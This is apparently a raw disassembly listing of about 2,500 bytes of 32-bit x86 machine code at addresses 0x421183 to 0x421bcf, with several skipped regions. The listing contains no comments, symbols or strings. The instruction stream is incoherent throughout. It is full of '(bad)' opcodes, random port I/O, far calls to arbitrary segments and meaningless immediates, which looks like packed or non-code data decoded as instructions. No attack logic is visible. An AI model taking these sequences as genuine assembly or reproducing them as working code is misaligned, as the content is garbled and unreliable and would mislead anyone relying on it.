  421183:	mov    al,0xbe
  421185:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421186:	sti    
  421187:	loopne 0x421205
  421189:	mov    al,0x54
  42118b:	lods   al,BYTE PTR ds:[esi]
  42118c:	jecxz  0x421206
  42118e:	and    DWORD PTR [edx],eax
  421190:	js     0x4211bf
  421192:	sbb    esp,esi
  421194:	cmc    
  421195:	mov    esi,0xae1e9e4a
  42119a:	stos   BYTE PTR es:[edi],al
  42119b:	and    BYTE PTR [bp+si],dh
  42119e:	loope  0x42113b
  4211a0:	push   ds
  4211a1:	jmp    0x4211a5
  4211a3:	fldenv [edi+0x3a]
  4211a6:	inc    ecx
  4211a7:	and    edi,ebx
  4211a9:	out    0x1a,eax
  4211ab:	fwait
  4211ac:	mov    eax,0xd00d740a
  4211b1:	mov    ds:0x7f1322e0,eax
  4211b6:	cmp    BYTE PTR [ecx+edi*8],0x95
  4211ba:	cs push ecx
  4211bc:	dec    edi
  4211bd:	adc    dl,BYTE PTR es:[ecx*8+0x413bd9a3]
  4211c5:	or     edx,ebp
  4211c7:	fnstsw WORD PTR [eax+0x219e5cdd]
  4211cd:	cmc    
  4211ce:	fisub  WORD PTR [edx+0x0]
  4211d1:	pop    ebx
  4211d2:	daa    
  4211d3:	jns    0x4211c5
  4211d5:	cmp    DWORD PTR [ecx],esp
  4211d7:	call   0x6f0a:0xf8075b60
  4211de:	jmp    0x4f1:0x1a926b39
  4211e5:	jb     0x4211c9
  4211e7:	fadd   st(1),st
  4211e9:	out    0x75,al
  4211eb:	mov    edi,es
  4211ed:	pop    esi
  4211ee:	push   eax
  4211ef:	out    dx,eax
  4211f0:	cld    
  4211f1:	cmp    al,0x10
  4211f3:	stos   BYTE PTR es:[edi],al
  4211f4:	cld    
  4211f5:	sub    DWORD PTR [edi-0x65],ecx
  4211f8:	mov    bh,0xa2
  4211fa:	mov    eax,0x16a4c06
  4211ff:	retf   0xb2c6
  421202:	mov    edi,0xe65dd9b
  421207:	push   ecx
  421208:	not    BYTE PTR [edi-0x41]
  42120b:	or     al,BYTE PTR [ebx]
  42120d:	(bad)  
  42120e:	mov    bh,0xb1
  421210:	loop   0x421212
	...
  421272:	add    BYTE PTR [eax],al
  421274:	sahf   
  421275:	pop    ds
  421276:	(bad)  
  421277:	test   DWORD PTR [edi-0x42800109],0x627ab32d
  421281:	sbb    BYTE PTR [ecx+0x1619d2b],al
  421287:	add    BYTE PTR ds:0x47000001,al
  42128d:	dec    ecx
  42128e:	pushw  cs
  421290:	mov    eax,0x370356d9
  421295:	sbb    eax,0x26b4b3b6
  42129a:	sub    BYTE PTR [ebp+0x4f7f0a18],cl
  4212a0:	add    DWORD PTR [edx-0x10],ecx
  4212a3:	xor    eax,0x66f6002d
  4212a8:	push   esi
  4212a9:	inc    ecx
  4212aa:	loopne 0x4212a1
  4212ac:	dec    ecx
  4212ad:	add    ch,BYTE PTR [edx-0x10c55ce8]
  4212b3:	mov    ds:0xd282309e,eax
  4212b8:	hlt    
  4212b9:	jg     0x421246
  4212bb:	out    0xe4,eax
  4212bd:	dec    ebp
  4212be:	cdq    
  4212bf:	jno    0x42129f
  4212c1:	lahf   
  4212c2:	out    0x64,al
  4212c4:	sti    
  4212c5:	jnp    0x4212f8
  4212c7:	pop    ecx
  4212c8:	xchg   edx,eax
  4212c9:	adc    bl,BYTE PTR [edi]
  4212cb:	addr16 add eax,0x28781783
  4212d1:	jb     0x421278
  4212d3:	into   
  4212d4:	not    DWORD PTR [esi+0x67]
  4212d7:	adc    al,0x6a
  4212d9:	xchg   edi,eax
  4212da:	pop    edx
  4212db:	rol    DWORD PTR [ebx+edi*1],0xa
  4212df:	xchg   ebx,eax
  4212e0:	data16 xlat BYTE PTR ds:[ebx]
  4212e2:	sbb    edx,ebx
  4212e4:	mov    WORD PTR [eax+eiz*4],ds
  4212e7:	iret   
  4212e8:	jle    0x421313
  4212ea:	add    edi,DWORD PTR [ebp-0x31]
  4212ed:	adc    DWORD PTR [esi+0x3182ff58],edx
  4212f3:	imul   ebx,DWORD PTR [edx+0x95d17d],0x81b5f0c5
  4212fd:	sbb    bh,BYTE PTR fs:[ecx-0x1cf0f77e]
  421304:	add    al,0xa0
  421306:	add    al,0xed
  421308:	imul   edi,DWORD PTR [ecx+0x17047a64],0xcabe4b1b
  421312:	outs   dx,BYTE PTR ds:[esi]
  421313:	xlat   BYTE PTR ds:[ebx]
  421314:	mov    cl,0xbb
  421317:	add    DWORD PTR [ebx],ecx
  421319:	mov    cl,0x62
  42131b:	ss sub eax,0xe06f1b69
  421321:	imul   BYTE PTR [eax+ebp*8-0x5b]
  421325:	nop
  421326:	xchg   BYTE PTR [edx+0x38],al
  421329:	or     DWORD PTR [ebp-0x65c9f2ef],esp
  42132f:	pop    edi
  421330:	in     eax,0x83
  421332:	inc    esi
  421333:	mov    bh,0xdf
  421335:	fsub   DWORD PTR [ecx-0x4806aaf9]
  42133b:	jecxz  0x42136f
  42133d:	add    al,0x10
  42133f:	fst    QWORD PTR [edi+eiz*4]
  421342:	int3   
  421343:	stc    
  421344:	sbb    dh,BYTE PTR [eax+0x57]
  421347:	and    al,0x24
  421349:	rcr    BYTE PTR [eax-0x47],1
  42134c:	lods   eax,DWORD PTR ds:[esi]
  42134d:	add    bh,BYTE PTR [esi+0xf]
  421350:	sbb    eax,0xca95bf0b
  421355:	enter  0xa879,0xd5
  421359:	(bad)  
  42135b:	push   0xd52d3eec
  421360:	jg     0x421348
  421362:	mov    eax,ds:0xd0e35148
  421367:	hlt    
  421368:	rol    ebx,0x86
  42136b:	ja     0x4213ca
  42136d:	xor    eax,0x3bd29d25
  421372:	cld    
  421373:	les    esi,FWORD PTR [ecx+0x54]
  421376:	sub    eax,0xb7567ae9
  42137b:	mov    dh,0x9e
  42137d:	cmp    BYTE PTR [ebx+0x7c],al
  421380:	add    ebx,DWORD PTR [ebx]
  421382:	inc    eax
  421383:	inc    edi
  421384:	add    dl,BYTE PTR [edx+0x60ee111e]
  42138a:	aas    
  42138b:	mov    dh,0xd9
  42138d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42138e:	add    eax,0xffffff92
	...
  4213f1:	add    BYTE PTR [eax],al
  4213f3:	add    dh,bh
  4213f5:	(bad)  
  4213f6:	pop    esp
  4213f7:	mov    eax,ds:0xdfffbb7d
  4213fc:	fstp   DWORD PTR [ebp-0x771d0b61]
  421402:	cdq    
  421403:	sbb    esp,DWORD PTR [edx+0x5000162]
  421409:	add    DWORD PTR [eax],eax
  42140b:	add    ah,ch
  42140d:	inc    ebp
  42140e:	and    ecx,ecx
  421410:	sub    dl,BYTE PTR ds:0xd43f24ef
  421416:	push   edx
  421417:	(bad)  
  421419:	repnz push esp
  42141b:	or     al,0x8
  42141d:	cmp    esi,0xffffffea
  421420:	dec    BYTE PTR [ebp-0x5c1e5a3a]
  421426:	pop    ebx
  421427:	cmp    BYTE PTR [eax+0x4ded68dc],ah
  42142d:	scas   al,BYTE PTR es:[edi]
  42142e:	sub    eax,0x646155fb
  421433:	pop    es
  421434:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421435:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421436:	push   esi
  421437:	inc    eax
  421438:	xchg   ebp,eax
  421439:	sbb    eax,0x2806e6df
  42143e:	aad    0xdf
  421440:	lea    esp,[edi]
  421442:	outs   dx,DWORD PTR ds:[esi]
  421443:	lds    ecx,FWORD PTR [edi]
  421445:	pop    ebx
  421446:	(bad)  
  421448:	xchg   ebx,eax
  421449:	mov    ah,0xf3
  42144b:	aaa    
  42144c:	ret    
  42144d:	sub    eax,0x625d2c51
  421452:	or     DWORD PTR [esp+edx*2-0x28fb5b01],esp
  421459:	shr    DWORD PTR [ebx-0x7b39feac],cl
  42145f:	cmp    BYTE PTR ds:0x6e473d8c,bh
  421465:	xchg   edx,eax
  421466:	fistp  QWORD PTR [ebx-0x33]
  421469:	(bad)  [edi]
  42146b:	outs   dx,DWORD PTR ds:[esi]
  42146c:	push   esi
  42146d:	or     ah,BYTE PTR [edi-0x15]
  421470:	test   DWORD PTR [edx+0x57],eax
  421473:	inc    edi
  421474:	bound  si,DWORD PTR [ecx+0x55535cab]
  42147b:	stos   DWORD PTR es:[edi],eax
  42147c:	(bad)  
  42147d:	int    0xa4
  42147f:	inc    esi
  421480:	mov    eax,0x89d78cab
  421485:	mov    eax,0x44e30f88
  42148a:	call   0x3c168352
  42148f:	push   0xb97a0656
  421494:	rcl    ebx,1
  421496:	dec    esi
  421497:	inc    esi
  421498:	push   ebp
  421499:	cdq    
  42149a:	(bad)  
  42149b:	outs   dx,DWORD PTR ds:[esi]
  42149c:	int3   
  42149d:	and    DWORD PTR [ebx-0x57],eax
  4214a0:	das    
  4214a1:	jecxz  0x42150a
  4214a3:	dec    esp
  4214a4:	jle    0x4214fd
  4214a6:	gs push ebp
  4214a8:	(bad)  
  4214a9:	or     ebp,esi
  4214ab:	push   ss
  4214ac:	or     BYTE PTR [ebx],0x9b
  4214af:	iret   
  4214b0:	push   edi
  4214b1:	jmp    0x4214da
  4214b3:	dec    esp
  4214b4:	daa    
  4214b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4214b6:	lods   eax,DWORD PTR ds:[esi]
  4214b7:	or     eax,0xcee3e75d
  4214bc:	in     eax,0x8e
  4214be:	xchg   edi,eax
  4214bf:	in     al,0x0
  4214c1:	push   edx
  4214c2:	pop    ecx
  4214c3:	sbb    eax,eax
  4214c5:	mov    bh,0xa
  4214c7:	(bad)  
  4214c8:	nop
  4214c9:	xchg   si,ax
  4214cb:	sub    BYTE PTR [ebx+0x78],dl
  4214ce:	cmp    al,0xd3
  4214d0:	std    
  4214d1:	push   es
  4214d2:	retf   0xc3e0
  4214d5:	adc    esi,ebx
  4214d7:	in     al,0x2f
  4214d9:	mov    al,ds:0x66825d59
  4214de:	xchg   esp,eax
  4214df:	fstp   st(5)
  4214e1:	inc    ecx
  4214e2:	add    DWORD PTR [esi+0x79],ebx
  4214e5:	hlt    
  4214e6:	xor    esp,ebp
  4214e8:	shl    BYTE PTR [eax],1
  4214ea:	dec    edx
  4214eb:	loop   0x42147d
  4214ed:	or     al,BYTE PTR [edi+0x40fc7dc8]
  4214f3:	xor    ecx,eax
  4214f5:	and    dl,bh
  4214f7:	loop   0x42151f
  4214f9:	bound  edx,QWORD PTR [edx]
  4214fb:	adc    bl,BYTE PTR [eiz*8-0x5ca144c6]
  421502:	mov    al,ds:0xf92af3e6
  421507:	mov    ch,0xe
  421509:	sbb    BYTE PTR [edi-0x52ba1aa1],ch
  42150f:	repnz sbb al,0x0
	...
  421572:	add    BYTE PTR [eax],al
  421574:	(bad)  
  421575:	repnz test BYTE PTR [eax],bl
  421578:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421579:	jle    0x421559
  42157b:	(bad)  
  42157c:	arpl   WORD PTR [eax-0x2b5bd4c],bp
  421582:	and    edi,DWORD PTR [ebp-0x59]
  421585:	arpl   WORD PTR [ecx],ax
  421587:	add    BYTE PTR ds:0xe3000001,al
  42158d:	and    al,0x83
  42158f:	xchg   dl,ah
  421591:	mov    ebp,0xa255723e
  421596:	xchg   esp,eax
  421597:	mov    al,ds:0x86576bdb
  42159c:	in     al,0xdb
  42159e:	mov    ecx,0xd8942fbd
  4215a3:	jb     0x421571
  4215a5:	fisubr DWORD PTR [ebx+0x4c]
  4215a8:	sbb    BYTE PTR [eax],dh
  4215aa:	add    dh,BYTE PTR [edx-0x4f]
  4215ad:	inc    ecx
  4215ae:	push   eax
  4215af:	mov    al,0xb1
  4215b1:	outs   dx,DWORD PTR fs:[esi]
  4215b3:	les    ecx,FWORD PTR [eax-0x2e369298]
  4215b9:	icebp  
  4215ba:	hlt    
  4215bb:	mov    eax,0x67e3ae00
  4215c0:	pop    ds
  4215c1:	push   ebx
  4215c2:	and    al,0x9e
  4215c4:	xchg   ch,ch
  4215c6:	push   cs
  4215c7:	mov    ch,0x5d
  4215c9:	pop    ebp
  4215ca:	fcmovbe st,st(3)
  4215cc:	(bad)  
  4215cd:	mov    ecx,0x160216bb
  4215d2:	retf   
  4215d3:	add    cl,BYTE PTR [ecx+0x2a]
  4215d6:	cmp    al,0x65
  4215d8:	cmp    dh,BYTE PTR [ecx]
  4215da:	fist   WORD PTR [edx+0x53]
  4215dd:	mov    esi,0x63c90031
  4215e2:	and    DWORD PTR [edi+0x40],edi
  4215e5:	ins    BYTE PTR es:[edi],dx
  4215e6:	pop    ebx
  4215e7:	cmp    BYTE PTR [ebp-0x6d],cl
  4215ea:	rcr    BYTE PTR [ebp+0xe2a7fb5],0x85
  4215f1:	cmp    ch,BYTE PTR ds:0x734363b
  4215f7:	retf   0x60ea
  4215fa:	and    BYTE PTR [ebx+0x78],0x60
  4215fe:	add    al,0x75
  421600:	add    edi,edi
  421602:	popa   
  421603:	mov    al,0xd9
  421605:	jnp    0x42161b
  421607:	and    BYTE PTR [edi],cl
  421609:	call   0xefe065cc
  42160e:	test   BYTE PTR [esi+eiz*4],0x35
  421612:	dec    edx
  421613:	(bad)  [eax-0x2ddc03f9]
  421619:	or     al,0xe0
  42161b:	lahf   
  42161c:	inc    esi
  42161d:	or     esi,edi
  42161f:	hlt    
  421620:	test   eax,ecx
  421622:	and    al,BYTE PTR [ebx-0x65]
  421625:	jl     0x421624
  421627:	in     al,dx
  421628:	mov    ebx,0x6d8f4b8c
  42162d:	dec    ecx
  42162e:	cwde   
  42162f:	int    0x2e
  421631:	je     0x42162f
  421633:	cmp    cl,BYTE PTR [esi]
  421635:	clc    
  421636:	mov    esi,0xd0d9849b
  42163b:	jns    0x421645
  42163d:	jge    0x421674
  42163f:	push   cs
  421640:	scas   eax,DWORD PTR es:[edi]
  421641:	mov    WORD PTR [eax-0x18],ss
  421644:	xchg   ebx,eax
  421645:	pop    ebx
  421646:	fs pop ss
  421648:	add    al,dh
  42164a:	push   ecx
  42164b:	push   0xe81d00e8
  421650:	ins    DWORD PTR es:[edi],dx
  421651:	in     al,0x32
  421653:	ret    0x92b8
  421656:	mov    eax,0xd33edfcd
  42165b:	jno    0x421603
  42165d:	adc    al,0xf2
  42165f:	inc    esi
  421660:	icebp  
  421661:	and    eax,0x5604ab39
  421666:	in     al,dx
  421667:	dec    BYTE PTR [eax]
  421669:	pop    edx
  42166a:	(bad)  
  42166b:	loope  0x4216cf
  42166d:	sbb    BYTE PTR [ebp+0x2d],dh
  421670:	out    0xb9,al
  421672:	inc    ebx
  421673:	loope  0x421615
  421675:	ins    BYTE PTR es:[edi],dx
  421676:	scas   al,BYTE PTR es:[edi]
  421677:	mov    edi,0xf5fc6766
  42167c:	jae    0x42168b
  42167e:	je     0x4216bb
  421680:	loopne 0x4216ae
  421682:	dec    esp
  421683:	mov    fs:0x3300da1c,al
  421689:	mov    edx,DWORD PTR [ecx-0x4d8ee0d4]
  42168f:	adc    DWORD PTR [edx+0x0],eax
	...
  4216f1:	add    BYTE PTR [eax],al
  4216f3:	add    BYTE PTR [ebx-0x105512d4],ch
  4216f9:	jmp    0x4216ea
  4216fb:	sub    eax,0xa3418669
  421700:	xchg   esi,eax
  421701:	or     eax,0x64acc1a5
  421706:	add    DWORD PTR [eax],eax
  421708:	add    eax,0xc1000001
  42170d:	cdq    
  42170e:	imul   esi,DWORD PTR [edi+0x2a],0xfadd1632
  421715:	nop
  421716:	outs   dx,BYTE PTR ds:[esi]
  421717:	ja     0x4216f1
  421719:	and    BYTE PTR [edx-0x14745253],cl
  42171f:	ds pop ds
  421721:	pop    eax
  421722:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421723:	inc    esi
  421724:	ret    
  421725:	leave  
  421726:	mov    ch,0x34
  421728:	pop    ebx
  421729:	jne    0x4216f5
  42172b:	dec    esp
  42172c:	iret   
  42172d:	sar    BYTE PTR [eax+0x2d84f12f],cl
  421733:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421734:	paddsw mm2,QWORD PTR [edx]
  421737:	xchg   ecx,eax
  421738:	pop    ebx
  421739:	div    BYTE PTR [esi-0x4d]
  42173c:	xchg   edx,eax
  42173d:	inc    edx
  42173e:	lea    eax,[ecx-0x7]
  421741:	sub    al,0x47
  421743:	pop    esi
  421744:	lock aaa 
  421746:	jae    0x421762
  421748:	into   
  421749:	mov    ecx,0x6fd22165
  42174e:	xor    eax,0xd16ee4fd
  421753:	ss mov ah,ah
  421756:	add    esi,DWORD PTR [ebx+0x2be6e3fd]
  42175c:	jecxz  0x421737
  42175e:	push   esp
  42175f:	jae    0x42179e
  421761:	adc    ah,BYTE PTR [esi+0x3c]
  421764:	add    BYTE PTR [ebx-0x4c5ae3f3],bh
  42176a:	xor    ah,BYTE PTR [edi-0x1]
  42176d:	mov    bh,0x55
  42176f:	pop    ebx
  421770:	jmp    0x421794
  421772:	popf   
  421773:	sar    DWORD PTR ds:0xcc30ff3f,1
  421779:	dec    ecx
  42177a:	xor    BYTE PTR [ebp-0x36],cl
  42177d:	pop    ds
  42177e:	xchg   edx,eax
  42177f:	inc    esi
  421780:	cmc    
  421781:	je     0x42171e
  421783:	mov    bh,BYTE PTR fs:[ebx+0x14]
  421787:	(bad)  
  421789:	loop   0x4217d7
  42178b:	cmp    BYTE PTR [edi+eax*4-0x65],0xed
  421790:	cmc    
  421791:	rcr    dl,cl
  421793:	mov    eax,ds:0x2712552e
  421798:	push   ecx
  421799:	popf   
  42179a:	jae    0x42177e
  42179c:	mov    ecx,0xc03b7a8c
  4217a1:	jns    0x4217f1
  4217a3:	test   BYTE PTR [eax],cl
  4217a5:	les    esi,FWORD PTR [edi]
  4217a7:	mov    esp,0x74bbf493
  4217ac:	jne    0x4217b1
  4217ae:	ret    
  4217af:	data16 mov ds:0x2b5c7f90,al
  4217b5:	xchg   DWORD PTR [ecx],esi
  4217b7:	cmc    
  4217b8:	xchg   edi,eax
  4217b9:	test   BYTE PTR [ebx*8+0x6fcca1c7],0x70
  4217c1:	mov    cl,0xfd
  4217c3:	jae    0x4217a6
  4217c5:	jo     0x42181d
  4217c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4217c8:	cs (bad) 
  4217ca:	imul   BYTE PTR [edi]
  4217cc:	sbb    cl,BYTE PTR [ecx+0x28]
  4217cf:	pop    es
  4217d0:	lahf   
  4217d1:	int    0x4b
  4217d3:	jno    0x421794
  4217d5:	imul   edx,DWORD PTR [eax-0x42ce7e96],0xb1327c44
  4217df:	pushf  
  4217e0:	aam    0x53
  4217e2:	pop    eax
  4217e3:	cmp    eax,DWORD PTR [esi]
  4217e5:	sbb    ebp,edi
  4217e7:	sub    al,0xb6
  4217e9:	dec    edx
  4217ea:	xchg   edi,eax
  4217eb:	outs   dx,BYTE PTR ds:[esi]
  4217ec:	mov    ds:0x6d21973c,al
  4217f1:	sub    bh,dl
  4217f3:	jae    0x421783
  4217f5:	sbb    al,0x59
  4217f7:	or     ecx,ebx
  4217f9:	out    dx,al
  4217fa:	sbb    eax,DWORD PTR [ebp+0x202fa5cc]
  421800:	mov    ah,0x5b
  421802:	repz loopne 0x42180a
  421805:	test   al,0xf0
  421807:	dec    ebx
  421808:	mov    eax,ds:0x3c482df0
  42180d:	mov    ecx,0x9a4441
	...
  421872:	add    BYTE PTR [eax],al
  421874:	shl    DWORD PTR [eax-0x6061f47],1
  42187a:	fnstenv [ecx-0x359a0174]
  421880:	jo     0x4218a4
  421882:	aaa    
  421883:	pop    ds
  421884:	mov    cl,0x65
  421886:	add    DWORD PTR [eax],eax
  421888:	add    eax,0xb1000001
  42188d:	pushw  0xdfe3
  421891:	jne    0x4218bb
  421893:	or     eax,0xdc505423
  421898:	daa    
  421899:	mov    ebx,0xa6ceef6d
  42189e:	dec    ebx
  42189f:	pop    esi
  4218a0:	(bad)  
  4218a1:	and    BYTE PTR [ecx-0x67],ch
  4218a4:	mov    bh,0x5
  4218a6:	fs xchg esp,eax
  4218a8:	stos   DWORD PTR es:[edi],eax
  4218a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4218aa:	in     al,dx
  4218ab:	test   eax,0x4ab2ac85
  4218b0:	hlt    
  4218b1:	bnd ja 0x4218aa
  4218b4:	adc    bl,BYTE PTR [edi-0x63]
  4218b7:	dec    edx
  4218b8:	dec    ebx
  4218b9:	push   ebp
  4218ba:	popa   
  4218bb:	sbb    bh,BYTE PTR [esi-0x1ba61063]
  4218c1:	out    dx,eax
  4218c2:	fidiv  WORD PTR [edx+0x7a]
  4218c5:	pusha  
  4218c6:	xchg   esp,eax
  4218c7:	sbb    ebp,DWORD PTR [ebp-0x2e9a50e8]
  4218cd:	mov    ebx,0xb5cbbd4d
  4218d2:	out    dx,eax
  4218d3:	cwde   
  4218d4:	rcl    DWORD PTR [esi-0x80],cl
  4218d7:	ds inc edi
  4218d9:	or     ebp,DWORD PTR [eax-0x7d6443e2]
  4218df:	into   
  4218e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4218e1:	inc    esi
  4218e2:	iret   
  4218e3:	cmp    DWORD PTR [eax],0x2f3a6109
  4218e9:	adc    ebx,DWORD PTR [ebp+0x7bd29555]
  4218ef:	ss dec edi
  4218f1:	add    DWORD PTR [edi],eax
  4218f3:	fst    DWORD PTR [edx]
  4218f5:	jge    0x42187d
  4218f7:	cmp    ah,al
  4218f9:	pop    ebp
  4218fa:	push   ss
  4218fb:	add    eax,0xfca16a11
  421900:	inc    esi
  421901:	mov    ah,0xbb
  421903:	call   0x62f5:0xecf2c8d
  42190a:	sub    dl,BYTE PTR [ebx]
  42190c:	inc    edi
  42190d:	mov    al,ds:0xdf47efb2
  421912:	sahf   
  421913:	xor    bl,BYTE PTR [esi-0x37988a9f]
  421919:	fisttp DWORD PTR [ecx-0x6a]
  42191c:	add    eax,0x33fcbe62
  421921:	stc    
  421922:	or     esp,DWORD PTR [edi]
  421924:	addr16 cmc 
  421926:	sbb    bl,ah
  421928:	dec    esp
  421929:	into   
  42192a:	leave  
  42192b:	mov    ch,0xe8
  42192d:	xor    ecx,DWORD PTR [edx]
  42192f:	mov    esi,0xf83363b6
  421934:	je     0x421932
  421936:	mov    esi,0x4a13e276
  42193b:	adc    DWORD PTR [edx-0x75],edx
  42193e:	ins    BYTE PTR es:[edi],dx
  42193f:	or     eax,0x6f160835
  421944:	stos   BYTE PTR es:[edi],al
  421945:	pop    ebp
  421946:	aad    0xb0
  421948:	add    esi,DWORD PTR [eax+0x41]
  42194b:	jle    0x421942
  42194d:	push   esp
  42194e:	jg     0x42191d
  421950:	cld    
  421951:	xor    DWORD PTR [ebp+ebp*8-0xd],edi
  421955:	pop    ebx
  421956:	dec    edx
  421957:	imul   esi,DWORD PTR [ecx-0x22],0xffffff91
  42195b:	fidivr DWORD PTR ds:0x89a35713
  421961:	mov    al,ds:0xd223c52c
  421966:	add    DWORD PTR [edi-0x62],eax
  421969:	fbstp  TBYTE PTR ds:0x3c04d1df
  42196f:	xchg   esi,eax
  421970:	ins    DWORD PTR es:[edi],dx
  421971:	enter  0xfc88,0xa8
  421975:	fdivr  DWORD PTR [ebx+0x79]
  421978:	jno    0x421971
  42197a:	ins    BYTE PTR es:[edi],dx
  42197b:	gs cli 
  42197d:	xor    eax,0xf3c2b805
  421982:	lods   al,BYTE PTR ds:[esi]
  421983:	push   ecx
  421984:	outs   dx,BYTE PTR ds:[esi]
  421985:	out    0x4a,eax
  421987:	jle    0x421a05
  421989:	repnz cmp ch,bh
  42198c:	jecxz  0x421917
  42198e:	add    DWORD PTR [esi+0x35],edx
	...
  4219f4:	(bad)  
  4219f5:	cld    
  4219f6:	je     0x421a15
  4219f8:	jbe    0x421997
  4219fa:	(bad)  
  4219fb:	(bad)  
  4219fc:	jns    0x4219ee
  4219fe:	sbb    al,0x7b
  421a00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421a01:	rcl    bh,0xce
  421a04:	mov    dh,0x66
  421a06:	add    DWORD PTR [eax],eax
  421a08:	add    eax,0xff000001
  421a0d:	and    al,BYTE PTR [esi-0x2dbc55c9]
  421a13:	xchg   edi,eax
  421a14:	loopne 0x421a0a
  421a16:	mov    ch,BYTE PTR [edi-0x73]
  421a19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421a1a:	xchg   edx,eax
  421a1b:	leave  
  421a1c:	(bad)  
  421a1d:	fstp   TBYTE PTR [eax]
  421a1f:	je     0x4219cb
  421a21:	js     0x421a15
  421a23:	mov    cl,BYTE PTR [eax]
  421a25:	jle    0xd33cd25f
  421a2b:	mov    edx,0x674c90bd
  421a30:	dec    eax
  421a31:	js     0x421a62
  421a33:	call   FWORD PTR [edi]
  421a35:	mov    bl,0xc0
  421a37:	cdq    
  421a38:	lods   al,BYTE PTR ds:[esi]
  421a39:	or     dl,BYTE PTR [eax]
  421a3b:	jns    0x4219f4
  421a3d:	test   eax,0xd0012834
  421a42:	push   esi
  421a43:	jnp    0x421a1e
  421a45:	dec    eax
  421a46:	dec    edx
  421a47:	lods   al,BYTE PTR ds:[esi]
  421a48:	div    DWORD PTR [ebp+0x5c5e5835]
  421a4e:	rcr    BYTE PTR [esi],cl
  421a50:	mov    esi,0xb1f872dc
  421a55:	into   
  421a56:	out    dx,al
  421a57:	leave  
  421a58:	sbb    BYTE PTR [eax-0x20],bh
  421a5b:	stos   BYTE PTR es:[edi],al
  421a5c:	out    dx,al
  421a5d:	jnp    0x421a6d
  421a5f:	push   edi
  421a60:	pop    eax
  421a61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421a62:	pop    ecx
  421a63:	and    DWORD PTR [edx-0x9],edx
  421a66:	ror    DWORD PTR [edi-0x20d2bbbe],1
  421a6c:	push   0x31f70d48
  421a71:	shl    BYTE PTR [esi-0x712f19ae],0xbe
  421a78:	push   edi
  421a79:	sub    eax,0x79f4966b
  421a7e:	jno    0x421a74
  421a80:	cmp    DWORD PTR [ecx+0x75],eax
  421a83:	sbb    ch,dh
  421a85:	repnz cmc 
  421a87:	loopne 0x421ab3
  421a89:	or     eax,0xc076ddfd
  421a8e:	std    
  421a8f:	leave  
  421a90:	pop    ds
  421a91:	imul   edi,ebx,0xc
  421a94:	inc    ebx
  421a95:	jns    0x421a48
  421a97:	les    ebp,FWORD PTR [eax]
  421a99:	xchg   ecx,eax
  421a9a:	cmc    
  421a9b:	dec    eax
  421a9c:	sub    BYTE PTR [ebx],al
  421a9e:	xor    al,0x25
  421aa0:	(bad)  
  421aa1:	push   esi
  421aa2:	mov    esi,0xace28867
  421aa7:	push   esp
  421aa8:	addr16 cwde 
  421aaa:	pop    eax
  421aab:	cmp    ch,BYTE PTR [eax+0x6d]
  421aae:	imul   ecx,DWORD PTR [edi],0xffffffec
  421ab1:	(bad)  
  421ab2:	adc    edi,DWORD PTR [esp+eax*4-0x5dcdbe81]
  421ab9:	jge    0x421b35
  421abb:	movd   DWORD PTR [ebx],mm4
  421abe:	repz inc eax
  421ac0:	mov    eax,ds:0xd17e9624
  421ac5:	pusha  
  421ac6:	scas   al,BYTE PTR es:[edi]
  421ac7:	and    eax,0xf2667390
  421acc:	jle    0x421a86
  421ace:	push   es
  421acf:	sub    DWORD PTR [esi+0x746f0ce0],ebp
  421ad5:	inc    esi
  421ad6:	call   0x53c3:0x77963033
  421add:	xlat   BYTE PTR ds:[ebx]
  421ade:	outs   dx,DWORD PTR ds:[esi]
  421adf:	or     edi,ebp
  421ae1:	(bad)  
  421ae2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ae3:	jecxz  0x421ab8
  421ae5:	and    eax,DWORD PTR [eax]
  421ae7:	sbb    edi,esi
  421ae9:	mov    ah,BYTE PTR [edx]
  421aeb:	sbb    eax,0x76006986
  421af0:	in     eax,0xf4
  421af2:	rol    DWORD PTR [edx],1
  421af4:	cdq    
  421af5:	push   ss
  421af6:	retf   
  421af7:	enter  0x4315,0xcd
  421afb:	xor    eax,0x76f3ad64
  421b00:	fisub  WORD PTR [eax-0x65]
  421b03:	mov    DWORD PTR [ebp+0x52],ecx
  421b06:	in     al,0xac
  421b08:	xchg   bl,dl
  421b0a:	sbb    bl,BYTE PTR [esi-0x43]
  421b0d:	push   edx
  421b0e:	dec    edx
  421b0f:	mov    ebp,0xa0
	...
  421b74:	push   ss
  421b75:	cdq    
  421b76:	jmp    0x37400b48
  421b7b:	fild   DWORD PTR [ecx+eax*8+0x28]
  421b7f:	or     dh,BYTE PTR [ebp+eiz*8-0x60]
  421b83:	out    0xbb,al
  421b85:	add    DWORD PTR [bx+si],eax
  421b88:	add    eax,0x84000001
  421b8d:	cdq    
  421b8e:	mov    ebp,0x65a55c70
  421b93:	xchg   ah,ch
  421b95:	and    al,0x1c
  421b97:	cmc    
  421b98:	(bad)  
  421b99:	out    0x37,eax
  421b9b:	jmp    0xc9e3022a
  421ba0:	rol    BYTE PTR [esi-0x80],0xf4
  421ba4:	xchg   DWORD PTR [eax+0x4b],esi
  421ba7:	xchg   edx,eax
  421ba8:	leave  
  421ba9:	adc    BYTE PTR [ecx-0x5c],bh
  421bac:	mov    WORD PTR [ecx+0x108daf0e],?
  421bb2:	fs inc eax
  421bb4:	fwait
  421bb5:	cmp    dh,BYTE PTR [ecx+0x7b]
  421bb8:	xor    BYTE PTR [edx],al
  421bba:	mov    dl,BYTE PTR [eax]
  421bbc:	loop   0x421b71
  421bbe:	jns    0x421bcd
  421bc0:	pop    ebx
  421bc1:	fistp  DWORD PTR [ebx]
  421bc3:	ja     0x421b9b
  421bc5:	sub    ebp,DWORD PTR [ecx-0x3f]
  421bc8:	das    
  421bc9:	add    al,BYTE PTR [edi-0x4061e55]
  421bcf:	push   cs
